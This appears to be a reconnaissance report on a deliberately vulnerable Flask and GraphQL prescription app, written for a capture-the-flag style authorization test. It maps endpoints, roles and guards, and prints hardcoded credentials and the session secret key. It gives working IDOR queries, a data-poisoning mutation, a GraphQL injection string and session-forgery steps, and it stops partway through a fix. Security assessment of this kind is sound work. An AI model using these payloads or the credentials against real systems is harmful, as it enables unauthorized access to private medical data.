# Reconnaissance Deliverable: MedGuard Prescription Management System

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the MedGuard application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

## 1. Executive Summary

MedGuard is a Flask-based prescription management web application that demonstrates **critical security vulnerabilities** across multiple domains. The application runs on Python 3.8.17 (EOL) with Flask 3.0.3 and exposes a dual-interface architecture: server-rendered HTML templates for user interaction and a GraphQL API for data operations.

**Core Technology Stack:**
- **Backend:** Flask 3.0.3 (Python 3.8.17), SQLAlchemy 2.0.30 ORM
- **Database:** SQLite 3.x (file-based, plaintext storage)
- **API Layer:** GraphQL (graphene 2.1.9, Flask-GraphQL 2.0.1)
- **Authentication:** Flask-Login 0.6.3 (session-based)
- **Frontend:** Bootstrap 4.5.2, jQuery 3.5.1, Jinja2 templates
- **Infrastructure:** Werkzeug 3.0.3 development server on HTTP port 5003 (0.0.0.0)

**Primary User-Facing Components:**
1. **Authentication Flow:** Login/logout functionality with hardcoded credentials (admin:!@ED#, user:user)
2. **Prescription Management:** Add prescription form (authenticated access)
3. **Prescription Viewing:** Display user prescriptions via GraphQL queries
4. **GraphQL API:** Interactive GraphiQL interface at `/api` (NO authentication required)

**Critical Attack Surface Findings:**
- GraphQL API completely unprotected - no authentication or authorization
- Insecure Direct Object Reference (IDOR) vulnerabilities in GraphQL resolvers
- Plaintext password storage with hardcoded credentials
- Hardcoded Flask secret key enabling session forgery
- No TLS/HTTPS - all traffic transmitted in plaintext
- GraphiQL interface publicly accessible with full schema introspection
- Client-side user ID storage in localStorage (XSS-vulnerable)

**Security Posture:** The application is fundamentally insecure with multiple critical vulnerabilities enabling complete data breach, credential theft, and unauthorized access without authentication.

## 2. Technology & Service Map

### Frontend Technologies
- **Framework:** Jinja2 3.1.4 (server-side template engine)
- **CSS Framework:** Bootstrap 4.5.2 (loaded from StackPath CDN)
- **JavaScript Library:** jQuery 3.5.1 (loaded from code.jquery.com CDN)
- **Additional Libraries:** Popper.js 2.5.3 (Bootstrap dependency)
- **Template Files:**
  - `base.html` - Base template with navigation
  - `login.html` - Login form with client-side authentication
  - `add_prescription.html` - Prescription entry form
  - `view_prescriptions.html` - Prescription display with GraphQL queries

### Backend Technologies
- **Language:** Python 3.8.17 (End of Life - no security updates)
- **Web Framework:** Flask 3.0.3 (current version)
- **WSGI Server:** Werkzeug 3.0.3 (development server, not production-ready)
- **ORM:** SQLAlchemy 2.0.30 (current version, parameterized queries)
- **GraphQL:** 
  - graphene 2.1.9 (GraphQL framework)
  - Flask-GraphQL 2.0.1 (Flask integration)
- **Authentication:** Flask-Login 0.6.3 (session management)
- **Session Signing:** itsdangerous (Flask default, HMAC-SHA256)

### Infrastructure
- **Hosting Provider:** Local development (localhost)
- **Web Server:** Werkzeug development server
- **Port:** 5003 (HTTP only, bound to 0.0.0.0 - all interfaces)
- **Protocol:** HTTP (NO TLS/HTTPS)
- **Container:** Docker with python:3.8-slim-buster base image
- **Database:** SQLite 3.x (in-process, file-based)
- **Database Location:** `/app/instance/prescriptions.db`

### Identified Subdomains
From subfinder scan (pre-recon):
- exchvm.nwcnet.localhost
- www.localhost
- autodiscover.regency.localhost
- mail02.regency.localhost
- mail03.regency.localhost
- tools.sonoma.edu.localhost
- mse-ca-mail.corp.mse.localhost
- server2.hunter.localhost
- sbs.allsaintsschool.localhost
- fndlync01.5ninesdata.localhost
- mail.localhost
- autodiscover.localhost
- mail.regency.localhost
- naeu2.naeuinc.localhost
- server02.counterintel.localhost
- owa.regency.localhost

**Note:** These subdomains appear to be from subdomain enumeration wordlists and are not actually associated with the target application.

### Open Ports & Services
From nmap scan (pre-recon):
- **Port 5003/tcp:** Werkzeug httpd 3.0.3 (Python 3.8.17) - MedGuard application
  - HTTP Title: "MedGuard" (redirects to /login)
  - Service: Main application target
- **Port 80/tcp:** Caddy httpd (not primary target)
- **Port 443/tcp:** SSL/HTTPS (Caddy, not primary target)
- **Port 631/tcp:** CUPS 2.3 (printer service, out of scope)
- **Port 8888/tcp:** sun-answerbook (out of scope)
- **Port 49158/tcp:** Golang net/http server (Tailscale, requires auth, out of scope)

**Primary Attack Surface:** Port 5003 - MedGuard Flask application

## 3. Authentication & Session Management Flow

### Entry Points
- **POST /login** - JSON-based credential authentication
- **GET /login** - Login form rendering
- **GET /logout** - Session termination (requires authentication)

### Mechanism: Step-by-Step Authentication Process

**Step 1: Login Form Access**
- User navigates to `http://localhost:5003/` (redirects to `/login`)
- Server renders `login.html` template with username/password fields
- **Code:** `/app/app.py` lines 67-69 (redirect), lines 71-83 (login handler)

**Step 2: Credential Submission**
- Client-side JavaScript captures form input
- Fetch API sends POST request to `/login` with JSON body:
  ```json
  {
    "username": "<user_input>",
    "password": "<user_input>"
  }
  ```
- **Code:** `/app/templates/login.html` lines 13-34 (client-side JS)

**Step 3: Server-Side Validation**
- Flask receives JSON payload at `/login` POST handler
- Extracts username from `request.json['username']` (line 75)
- Queries database: `User.query.filter_by(username=data['username']).first()`
- **CRITICAL VULNERABILITY:** Compares plaintext password (line 76):
  ```python
  if user and user.password == data['password']:
  ```
- No password hashing - direct string comparison
- **Code:** `/app/app.py` lines 74-76

**Step 4: Session Creation**
- On successful authentication, calls `login_user(user)` (line 77)
- Flask-Login creates session:
  - Stores user ID in Flask session object
  - Serializes session data with itsdangerous
  - Signs session with secret key (line 9): `@#$%^R&GYUIUBJIU#@*DF&G*H`
  - Sets session cookie in HTTP response
- **Code:** `/app/app.py` line 77

**Step 5: Client-Side Session Storage**
- Server responds with JSON including user ID:
  ```json
  {
    "message": "Login successful",
    "userID": <integer>
  }
  ```
- **VULNERABILITY:** Client stores userID in localStorage:
  ```javascript
  localStorage.setItem('userID', data.userID);
  ```
- Exposes user ID to XSS attacks and client-side manipulation
- **Code:** `/app/templates/login.html` line 27

**Step 6: Redirect to Authenticated Area**
- Client redirects to `/add_prescription` page
- Session cookie automatically included in subsequent requests
- **Code:** `/app/templates/login.html` line 29

**Step 7: Session Validation on Protected Routes**
- Each request to protected endpoint (e.g., `/add_prescription`)
- `@login_required` decorator checks authentication (line 95)
- Flask-Login:
  1. Extracts session cookie
  2. Verifies HMAC signature with secret key
  3. Deserializes user ID
  4. Calls `load_user()` to reconstruct User object (lines 30-33)
  5. Database query: `db.session.get(User, int(user_id))`
- User object available as `current_user` in route handlers
- **Code:** `/app/app.py` lines 30-33 (user loader), line 95 (decorator)

**Step 8: Logout**
- User clicks logout link (GET `/logout`)
- `logout_user()` clears session (line 88)
- Flask sets expired session cookie
- **VULNERABILITY:** localStorage userID not cleared
- Redirect to login page
- **Code:** `/app/app.py` lines 85-89

### Code Pointers

**Primary Authentication Files:**
- `/app/app.py` lines 71-83 - Login route handler
- `/app/app.py` line 9 - Hardcoded secret key
- `/app/app.py` lines 15-16 - Flask-Login initialization
- `/app/app.py` lines 30-33 - User loader callback
- `/app/app.py` lines 85-89 - Logout handler
- `/app/templates/login.html` lines 13-34 - Client-side authentication JS
- `/app/templates/login.html` line 27 - localStorage vulnerability

**Database Models:**
- `/app/app.py` lines 19-22 - User model (plaintext password storage)

**Session Configuration:**
- `/app/app.py` line 9 - Secret key (hardcoded)
- NO cookie security flags configured (missing Secure, SameSite)

### 3.1 Role Assignment Process

**Role Determination:** NO ROLE-BASED ACCESS CONTROL IMPLEMENTED

The application does not implement any role differentiation system. Despite having "admin" and "user" accounts with different usernames, there is no programmatic distinction in capabilities or access control.

**Evidence:**
- User model contains no `role` field (`/app/app.py` lines 19-22)
- No role checks in any route handlers or GraphQL resolvers
- All authenticated users have identical access to application features
- The only distinction is at authentication level (authenticated vs unauthenticated)

**Database Schema:**
```python
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)
    # NO ROLE FIELD
```

**Default Role:** N/A - No role system exists

**Role Upgrade Path:** N/A - No role system exists

**Code Implementation:** NO role assignment logic found in codebase

**Hardcoded Accounts:**
- Admin account: username='admin', password='!@ED#' (`/app/app.py` line 112)
- User account: username='user', password='user' (`/app/app.py` line 116)
- Both accounts have identical capabilities in the application

### 3.2 Privilege Storage & Validation

**Storage Location:** NO PRIVILEGE DATA STORED

Since no role-based access control exists, there is no privilege storage mechanism.

**Session Storage:**
- Flask session cookie stores only user ID (managed by Flask-Login)
- No role claims, no permission tokens, no privilege data
- Session structure: `{'_user_id': '<user_id>'}`

**Validation Points:** 
- Only authentication validation exists via `@login_required` decorator
- Applied to: `/logout`, `/add_prescription`, `/view_prescriptions`
- **CRITICAL MISSING:** GraphQL endpoint `/api` has NO `@login_required` (line 65)

**Code Pointers:**
- `/app/app.py` line 86 - `@login_required` on logout
- `/app/app.py` line 95 - `@login_required` on add_prescription
- `/app/app.py` line 100 - `@login_required` on view_prescriptions
- `/app/app.py` line 65 - `/api` endpoint MISSING `@login_required`

**Cache/Session Persistence:**
- Session lifetime: Browser session (no PERMANENT_SESSION_LIFETIME configured)
- Default 31-day expiration if PERMANENT set (not configured)
- No session timeout or automatic refresh
- User object queried from database on every request (no caching)

### 3.3 Role Switching & Impersonation

**Impersonation Features:** NONE IMPLEMENTED

**Role Switching:** NONE IMPLEMENTED

**Audit Trail:** NO LOGGING IMPLEMENTED
- No audit logs for authentication events
- No logging of session creation/destruction
- No tracking of data access or modifications
- Flask default logging to stdout only

**Code Implementation:** No impersonation or role switching code found in application

**Conclusion:** The application lacks any role-based access control, privilege management, or administrative oversight features.

## 4. API Endpoint Inventory

**Network Surface Focus:** All endpoints below are network-accessible via HTTP on port 5003. Database initialization scripts and Docker build processes have been excluded.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| GET | `/` | anon | None | None | Root redirect to login page. **Code:** `/app/app.py` lines 67-69 |
| GET | `/login` | anon | None | None | Renders login form. If already authenticated, redirects to `/add_prescription`. **Code:** `/app/app.py` lines 71-83 |
| POST | `/login` | anon | None | None | Authenticates user with JSON payload `{username, password}`. Returns `{message, userID}` on success. **VULNERABILITY:** Plaintext password comparison (line 76). **Code:** `/app/app.py` lines 71-83 |
| GET | `/logout` | user | None | Flask-Login `@login_required` (line 86) | Terminates user session and redirects to login. **Code:** `/app/app.py` lines 85-89 |
| GET | `/add_prescription` | user | None | Flask-Login `@login_required` (line 95) | Renders prescription entry form. Passes `userID=current_user.id` to template. **Code:** `/app/app.py` lines 94-97 |
| GET | `/view_prescriptions` | user | None | Flask-Login `@login_required` (line 100) | Renders prescription viewing page. Passes `userID` and `username` to template. **Code:** `/app/app.py` lines 99-103 |
| GET | `/api` | **anon** | None | **NONE - CRITICAL** | GraphiQL interactive interface for GraphQL schema exploration. **VULNERABILITY:** No authentication required. **Code:** `/app/app.py` line 65 |
| POST | `/api` | **anon** | None | **NONE - CRITICAL** | GraphQL endpoint accepting queries and mutations. **VULNERABILITY:** No authentication or authorization. **Code:** `/app/app.py` line 65 |

**GraphQL Operations (via POST /api):**

| Operation | Type | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|-----------|------|---------------------|-------------------------|----------------------------|
| `getPrescriptions` | Query | `userId` (Int, required) | **NONE - CRITICAL IDOR** | Returns all prescriptions for specified user ID. **VULNERABILITY:** No validation that userId matches authenticated user (if auth existed). Accepts ANY user_id value. **Code:** `/app/app.py` lines 44-45 |
| `addPrescription` | Mutation | `userId` (Int, required) | **NONE - CRITICAL IDOR** | Creates prescription for specified user ID with given details. **VULNERABILITY:** No ownership validation. Can create prescriptions for ANY user. **Code:** `/app/app.py` lines 54-58 |

**GraphQL Schema Types:**

| Type | Fields | Sensitive Data | Code Pointer |
|------|--------|---------------|--------------|
| `PrescriptionType` | `id`, `user_id`, `prescription_details`, `flag` | **flag** field contains CTF challenge flag (prescription #43 for admin) | `/app/app.py` lines 35-39 |
| `Query` | `get_prescriptions(user_id: Int!)` | Returns all user prescriptions including flag | `/app/app.py` lines 41-45 |
| `Mutation` | `add_prescription(user_id: Int!, prescription_details: String)` | Creates prescriptions for any user | `/app/app.py` lines 47-61 |

**Critical Authorization Gaps:**

1. **GraphQL Endpoint Unauthenticated:** `/api` has no `@login_required` decorator
   - **Impact:** Anyone can query/mutate data without authentication
   - **Attack:** Direct curl/POST requests to extract all data including flag
   - **Code:** `/app/app.py` line 65

2. **IDOR in getPrescriptions Query:** Accepts arbitrary `user_id` parameter
   - **Impact:** Horizontal privilege escalation - access any user's prescriptions
   - **Attack:** Query with `userId: 1` to get admin's prescriptions + flag
   - **Code:** `/app/app.py` lines 44-45

3. **IDOR in addPrescription Mutation:** Accepts arbitrary `user_id` parameter
   - **Impact:** Data integrity compromise - create prescriptions for other users
   - **Attack:** Create malicious prescriptions under admin account
   - **Code:** `/app/app.py` lines 54-58

4. **GraphiQL Schema Introspection:** Full schema exposed via browser interface
   - **Impact:** Information disclosure - attacker learns all fields including `flag`
   - **Attack:** Browse to `http://localhost:5003/api` to explore schema
   - **Code:** `/app/app.py` line 65 (`graphiql=True`)

**Template-Based Client Code:**

The templates contain JavaScript that constructs GraphQL queries using user-controllable variables:

- **add_prescription.html line 24:** Constructs mutation with `${userID}` and `"${prescriptionDetails}"`
  - **VULNERABILITY:** String interpolation enables GraphQL injection
  - User can inject GraphQL syntax by including quotes in prescriptionDetails
  
- **view_prescriptions.html line 26:** Constructs query with `${userID}`
  - **VULNERABILITY:** Client-side userID can be modified (localStorage or in-template variable)
  - Enables IDOR by changing userID value before query execution

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only input vectors accessible through the target web application (HTTP on port 5003) are included. Database initialization and Docker build inputs are excluded.

### URL Parameters
**No URL query parameters used in the application.** All endpoints use either:
- Path-only routes (e.g., `/login`, `/logout`)
- POST JSON bodies for data submission
- GraphQL request bodies for API operations

### POST Body Fields (JSON/Form)

**Endpoint: POST /login**
- **Content-Type:** application/json
- **Fields:**
  - `username` (string) - User login identifier
    - **Location:** `/app/app.py` line 75
    - **Validation:** None
    - **Sink:** SQLAlchemy `filter_by()` - parameterized query (safe from SQLi)
  - `password` (string) - User plaintext password
    - **Location:** `/app/app.py` line 76
    - **Validation:** None
    - **Comparison:** Direct plaintext comparison (no hashing)

**GraphQL Endpoint: POST /api**
- **Content-Type:** application/json
- **Body Structure:** `{"query": "<GraphQL query/mutation string>"}`
- **Query: getPrescriptions**
  - `userId` (integer, required) - Target user ID for prescription retrieval
    - **Location:** `/app/app.py` line 44 (resolver parameter)
    - **Validation:** GraphQL type coercion to Int only
    - **Authorization:** **NONE - IDOR VULNERABILITY**
    - **Sink:** SQLAlchemy `filter_by(user_id=user_id)` - line 45
- **Mutation: addPrescription**
  - `userId` (integer, required) - Target user ID for prescription creation
    - **Location:** `/app/app.py` line 54 (mutation argument)
    - **Validation:** GraphQL type coercion to Int only
    - **Authorization:** **NONE - IDOR VULNERABILITY**
    - **Sink:** Prescription object creation - line 55
  - `prescriptionDetails` (string) - Prescription content
    - **Location:** `/app/app.py` line 50 (mutation argument)
    - **Validation:** GraphQL type coercion to String only
    - **Database Constraint:** VARCHAR(200) max length
    - **Sink:** Prescription object creation - line 55
    - **Client-Side Construction:** String interpolation in `/app/templates/add_prescription.html` line 24 - **GRAPHQL INJECTION RISK**

### HTTP Headers
**No custom HTTP headers processed by the application.**

The application does not read or process:
- `X-Forwarded-For`
- `User-Agent`
- `Referer`
- Custom headers

**Flask/Werkzeug automatically processes:**
- `Cookie` header (for session cookies)
- `Content-Type` header (for JSON parsing)
- Standard HTTP headers (Host, Accept, etc.)

None of these are used as input to business logic or database queries.

### Cookie Values

**Session Cookie:**
- **Name:** `session` (Flask default)
- **Value:** Signed session data (itsdangerous serialization)
- **Format:** `<base64_session_data>.<timestamp>.<hmac_signature>`
- **Content:** User ID for Flask-Login session
- **Processing:** 
  - Extracted by Flask-Login automatically
  - Signature verified with secret key (`/app/app.py` line 9)
  - Deserialized to get user_id
  - User loaded via `load_user()` callback (lines 30-33)
- **Security:** HMAC-signed but vulnerable to forgery if secret key compromised

**localStorage (Client-Side, Not Cookie):**
- **Key:** `userID`
- **Set at:** `/app/templates/login.html` line 27
- **Value:** User ID (integer)
- **Usage:** Client-side variable in templates (not used for server-side authorization)
- **Security Risk:** XSS vulnerability - accessible to JavaScript

### Client-Side Variables in Templates

**add_prescription.html:**
- **Variable:** `userID`
- **Source:** Server-side template rendering: `userID={{ current_user.id }}` (line 97 in app.py)
- **Usage:** Embedded in GraphQL mutation string (line 24 in template)
- **Risk:** GraphQL injection via string interpolation

**view_prescriptions.html:**
- **Variable:** `userID`
- **Source:** Server-side template rendering: `userID={{ current_user.id }}` (line 103 in app.py)
- **Usage:** Embedded in GraphQL query string (line 26 in template)
- **Risk:** IDOR if client modifies variable before execution (though server-rendered)
- **Bug:** JavaScript error "userID is not defined" observed in browser console, suggesting variable scoping issue

### Complete Input Vector Summary Table

| Input Vector | Endpoint | Parameter Name | Type | Validation | Authorization | Code Location |
|--------------|----------|----------------|------|------------|---------------|---------------|
| JSON Body | POST /login | username | String | None | None (public) | `/app/app.py:75` |
| JSON Body | POST /login | password | String | None | None (public) | `/app/app.py:76` |
| GraphQL Query | POST /api | userId | Int | Type only | **NONE** | `/app/app.py:44-45` |
| GraphQL Mutation | POST /api | userId | Int | Type only | **NONE** | `/app/app.py:54-58` |
| GraphQL Mutation | POST /api | prescriptionDetails | String | Type only | None | `/app/app.py:54-58` |
| Cookie | All authenticated | session | Signed data | HMAC | Flask-Login | `/app/app.py:30-33` |
| Template Variable | /add_prescription | userID (client JS) | Int | None | Server-rendered | `/app/templates/add_prescription.html:24` |
| Template Variable | /view_prescriptions | userID (client JS) | Int | None | Server-rendered | `/app/templates/view_prescriptions.html:26` |
| localStorage | Client-side | userID | Int | None | Not used server-side | `/app/templates/login.html:27` |

### GraphQL Injection Vector Details

**Location:** `/app/templates/add_prescription.html` line 24

**Vulnerable Code:**
```javascript
query: `
    mutation {
        addPrescription(userId: ${userID}, prescriptionDetails: "${prescriptionDetails}") {
            prescription {
                id
                userId
                prescriptionDetails
            }
        }
    }
`
```

**Injection Mechanism:**
User input in `prescriptionDetails` field is directly interpolated into GraphQL query string. If user inputs a quote character (`"`), they can break out of the string context and inject additional GraphQL syntax.

**Example Attack:**
```javascript
prescriptionDetails = '" } prescription { flag } } { getPrescriptions(userId:1) { flag'
```

This would modify the query structure to extract the flag field from admin's prescriptions.

**Proper Fix:** Use GraphQL variables instead of string interpolation:
```javascript
body: JSON.stringify({
    query: `mutation($userId: Int!, $details: String!) {
        addPrescription(userId: $userId, prescriptionDetails: $details) { ... }
    }`,
    variables: {
        userId: userID,
        details: prescriptionDetails
    }
})
```

## 6. Network & Interaction Map

**Network Surface Focus:** Only components accessible via the deployed web application on port 5003 are mapped. Development tools, CI/CD, and local-only components are excluded.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| UserBrowser | ExternAsset | Internet | Browser (Chrome/Firefox) | PII, Tokens | User's web browser accessing application |
| MedGuardApp | Service | App | Flask 3.0.3, Python 3.8.17 | PII, Tokens, Secrets | Main application server on port 5003 |
| GraphQLEndpoint | Service | App | Flask-GraphQL 2.0.1, graphene 2.1.9 | PII, Tokens | GraphQL API at /api (UNAUTHENTICATED) |
| SQLiteDB | DataStore | Data | SQLite 3.x | PII, Tokens, Secrets | File-based database at /app/instance/prescriptions.db |
| BootstrapCDN | ThirdParty | Internet | StackPath CDN | Public | External CSS/JS library hosting |
| jQueryCDN | ThirdParty | Internet | code.jquery.com | Public | External JavaScript library hosting |

### 6.2 Entity Metadata

| Title | Metadata Key: Value |
|-------|---------------------|
| UserBrowser | Hosts: Client-side; Origin: External Internet; Authentication: Session Cookie; LocalStorage: userID (XSS-vulnerable) |
| MedGuardApp | Hosts: http://localhost:5003; Endpoints: /, /login, /logout, /add_prescription, /view_prescriptions, /api; Auth: Flask-Login session; Dependencies: SQLiteDB, GraphQLEndpoint; SecretKey: @#$%^R&GYUIUBJIU#@*DF&G*H (hardcoded) |
| GraphQLEndpoint | Hosts: http://localhost:5003/api; Operations: getPrescriptions, addPrescription; Auth: NONE (critical vulnerability); GraphiQL: Enabled (schema introspection); Introspection: Enabled |
| SQLiteDB | Engine: SQLite 3.x; Location: /app/instance/prescriptions.db; Exposure: In-process only; Encryption: NONE (plaintext); Tables: user, prescription; Credentials: None (in-process database) |
| BootstrapCDN | Hosts: stackpath.bootstrapcdn.com; Version: 4.5.2; Protocol: HTTPS; SRI: Not verified (no integrity attribute) |
| jQueryCDN | Hosts: code.jquery.com; Version: 3.5.1; Protocol: HTTPS; SRI: Not verified (no integrity attribute) |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| UserBrowser → MedGuardApp | HTTP | :5003 / | None | Public |
| UserBrowser → MedGuardApp | HTTP | :5003 /login (POST) | None | PII (credentials) |
| UserBrowser → MedGuardApp | HTTP | :5003 /logout | auth:user | None |
| UserBrowser → MedGuardApp | HTTP | :5003 /add_prescription | auth:user | PII |
| UserBrowser → MedGuardApp | HTTP | :5003 /view_prescriptions | auth:user | PII |
| UserBrowser → GraphQLEndpoint | HTTP | :5003 /api | **NONE - CRITICAL** | PII, Tokens, Secrets (flag) |
| MedGuardApp → SQLiteDB | File I/O | /app/instance/prescriptions.db | In-process only | PII, Tokens, Secrets |
| GraphQLEndpoint → SQLiteDB | File I/O | /app/instance/prescriptions.db | **NONE - CRITICAL** | PII, Tokens, Secrets |
| UserBrowser → BootstrapCDN | HTTPS | :443 (stackpath.bootstrapcdn.com) | None | Public |
| UserBrowser → jQueryCDN | HTTPS | :443 (code.jquery.com) | None | Public |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| auth:user | Auth | Requires a valid Flask-Login session cookie with authenticated user. Enforced by `@login_required` decorator. Session validated via HMAC signature with secret key. |
| auth:admin | Authorization | NOT IMPLEMENTED - No admin role exists in application despite "admin" username. No code checks for elevated privileges. |
| ownership:user | ObjectOwnership | NOT IMPLEMENTED - No validation that requested user_id matches current_user.id. Enables IDOR vulnerabilities. |
| ownership:prescription | ObjectOwnership | NOT IMPLEMENTED - No validation that prescription belongs to requesting user. All GraphQL operations accept arbitrary user_id. |
| in-process | Network | Database is in-process (SQLite), no network connection, no authentication. Security relies entirely on filesystem permissions. |
| no-tls | Protocol | ALL communications over plaintext HTTP. No TLS/HTTPS configured. Credentials and session cookies transmitted unencrypted. |
| no-csrf | Protocol | NO CSRF protection configured despite flask_wtf in requirements.txt. All POST endpoints vulnerable to CSRF attacks. |
| no-authz | Authorization | GraphQL endpoint /api has NO authentication or authorization. Anyone can query or mutate data without login. |
| graphiql-enabled | Access | Interactive GraphiQL interface enabled at /api. Full schema introspection available to unauthenticated users. |

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

**CRITICAL FINDING:** NO role-based access control (RBAC) system exists in the application.

The application implements a **binary authentication model** only:
1. **Unauthenticated** (anonymous) - Access to public routes only
2. **Authenticated** (any logged-in user) - Access to protected routes

Despite having accounts named "admin" and "user", there is **no programmatic differentiation** in capabilities, permissions, or access control.

**Evidence:**

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| anon | 0 (no auth) | Global | No authentication required. Access to: /, /login |
| user | 1 (authenticated) | Global | Flask-Login session. `@login_required` decorator. Access to: /logout, /add_prescription, /view_prescriptions |
| admin | 1 (authenticated) | Global | **IDENTICAL TO "user"** - No special permissions. Same access as regular users. No role field in database. |

**User Model Analysis:**
```python
# /app/app.py lines 19-22
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)
    # NO role FIELD
    # NO is_admin FIELD
    # NO permissions FIELD
```

**No Role Checks Found:**
- Searched all route handlers: No `if current_user.role == 'admin'` patterns
- Searched all GraphQL resolvers: No role validation
- Searched all templates: No role-based UI rendering
- No decorators like `@admin_required` or `@role_required('admin')`

**Hardcoded Accounts:**
```python
# /app/app.py lines 111-119
user1 = User(username='admin', password='!@ED#')  # Line 112
user2 = User(username='user', password='user')    # Line 116
```

Both accounts have identical database structure and identical application capabilities. The "admin" username is purely cosmetic.

### 7.2 Privilege Lattice

**CRITICAL:** There is no privilege hierarchy because there is no role system.

```
Privilege Ordering:
anon (Level 0) → authenticated (Level 1)

That's it. No further hierarchy exists.
```

**Visual Representation:**
```
┌──────────────────────────────────────────┐
│         PRIVILEGE STRUCTURE              │
├──────────────────────────────────────────┤
│                                          │
│  Level 1: AUTHENTICATED                  │
│  ┌────────────────────────────────────┐  │
│  │  "admin" user (username='admin')   │  │
│  │  "user" account (username='user')  │  │
│  │  ANY logged-in user                │  │
│  │                                    │  │
│  │  ALL HAVE IDENTICAL CAPABILITIES   │  │
│  └────────────────────────────────────┘  │
│                    ▲                     │
│                    │                     │
│                    │ @login_required     │
│                    │                     │
│  Level 0: UNAUTHENTICATED               │
│  ┌────────────────────────────────────┐  │
│  │  Anonymous visitors                │  │
│  │  Access: /, /login                 │  │
│  └────────────────────────────────────┘  │
└──────────────────────────────────────────┘
```

**No Parallel Isolation:** There are no department-specific, team-specific, or organization-specific roles.

**No Role Switching:** There is no impersonation, sudo mode, or privilege elevation mechanism because there are no elevated privileges to switch to.

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|--------------------------|----------------------|
| anon | `/login` (redirected from /) | `/`, `/login` | None |
| authenticated (all users) | `/add_prescription` | `/logout`, `/add_prescription`, `/view_prescriptions` | Flask-Login session cookie |
| **GraphQL API** | N/A (API only) | `/api` (GraphiQL + queries/mutations) | **NONE - Unauthenticated access** |

**Note:** The GraphQL API at `/api` is accessible to **both anonymous and authenticated users** because it has no `@login_required` decorator (line 65 in app.py).

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| anon | None | None | N/A |
| authenticated | `@login_required` (Flask-Login) | `current_user.is_authenticated` | Session cookie (user_id only) |
| admin | **DOES NOT EXIST** | **NO ADMIN CHECKS** | **NO ROLE FIELD** |

**Decorator Locations:**
- `/app/app.py` line 86 - `@login_required` on `/logout`
- `/app/app.py` line 95 - `@login_required` on `/add_prescription`
- `/app/app.py` line 100 - `@login_required` on `/view_prescriptions`
- `/app/app.py` line 65 - `/api` GraphQL endpoint **MISSING @login_required**

**Permission Check Locations:**
- **NONE** - No role-based permission checks anywhere in codebase
- Only authentication checks via Flask-Login's `@login_required`

**Storage Location:**
- Session cookie stores only `user_id` (integer)
- No role, no permissions, no capabilities stored
- User object reconstructed from database on each request
- Database User model has no role field

**Critical Gap:** Even if a role field were added to the database, **no code exists to check or enforce it**.

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

Ranked by exploitability and data sensitivity:

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity | Attack Vector |
|----------|------------------|---------------------|-----------|-------------|---------------|
| **CRITICAL** | POST `/api` (GraphQL query) | `userId` in `getPrescriptions` query | Prescription data (PHI) | **CRITICAL - Contains FLAG** | **IDOR-001:** Query accepts arbitrary `userId`. No validation that `userId` matches `current_user.id`. Code: `/app/app.py:44-45`. Attack: `query { getPrescriptions(userId: 1) { id prescriptionDetails flag } }` extracts admin's 89 prescriptions including prescription #43 with FLAG. |
| **CRITICAL** | POST `/api` (GraphQL mutation) | `userId` in `addPrescription` mutation | Prescription data (PHI) | **HIGH - Data integrity** | **IDOR-002:** Mutation accepts arbitrary `userId`. No ownership validation. Code: `/app/app.py:54-58`. Attack: `mutation { addPrescription(userId: 1, prescriptionDetails: "Malicious prescription") { ... } }` creates prescription under admin account (data poisoning). |
| **HIGH** | Client-side manipulation | `userID` variable in templates | Prescription data | **HIGH - Client-controlled** | **IDOR-003:** JavaScript in templates uses `userID` variable without server-side validation. Code: `/app/templates/view_prescriptions.html:26`, `/app/templates/add_prescription.html:24`. Attack: Modify `userID` in browser console/DevTools before executing GraphQL query to access other users' data. |
| **MEDIUM** | Session cookie | `user_id` in session data | User account | **MEDIUM - Requires secret key** | **Session Forgery:** Hardcoded secret key (`/app/app.py:9`) enables forging session cookies for any user_id. Attack: Use itsdangerous library with known secret to generate valid session cookie for admin (user_id=1). |

**Detailed IDOR-001 (Horizontal Escalation via getPrescriptions):**

**Vulnerability Code:**
```python
# /app/app.py lines 44-45
def resolve_get_prescriptions(self, info, user_id):
    return Prescription.query.filter_by(user_id=user_id).all()
```

**Missing Authorization Check:**
```python
# SHOULD BE:
def resolve_get_prescriptions(self, info, user_id):
    if not current_user.is_authenticated:
        raise Exception("Authentication required")
    if user_id != current_user.id:
        raise Exception("Cannot access other users' prescriptions")
